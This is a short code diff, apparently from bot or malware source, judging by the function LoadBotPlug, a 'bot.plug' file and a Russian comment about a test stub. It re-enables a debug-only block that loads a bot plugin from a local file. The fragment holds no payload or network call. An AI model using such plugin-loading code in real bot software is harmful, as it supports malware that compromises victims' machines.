@@ -264,11 +264,13 @@ BOOL WINAPI LoadBotPlug(LPVOID *Buf, DWORD *BufSize)
 	*Buf = NULL;
 
 
+#ifdef DEBUGCONFIG
 	// Заглушка на время тестов
-//	DWORD Sz = 0;
-//	*Buf = File::ReadToBufferA("c:\\bot.plug", Sz);
-//	if (BufSize) *BufSize = Sz;
-//	return *Buf != NULL;
+	DWORD Sz = 0;
+	*Buf = File::ReadToBufferA("c:\\bot.plug", Sz);
+	if (BufSize) *BufSize = Sz;
+	return *Buf != NULL;
+#endif
 
 
 
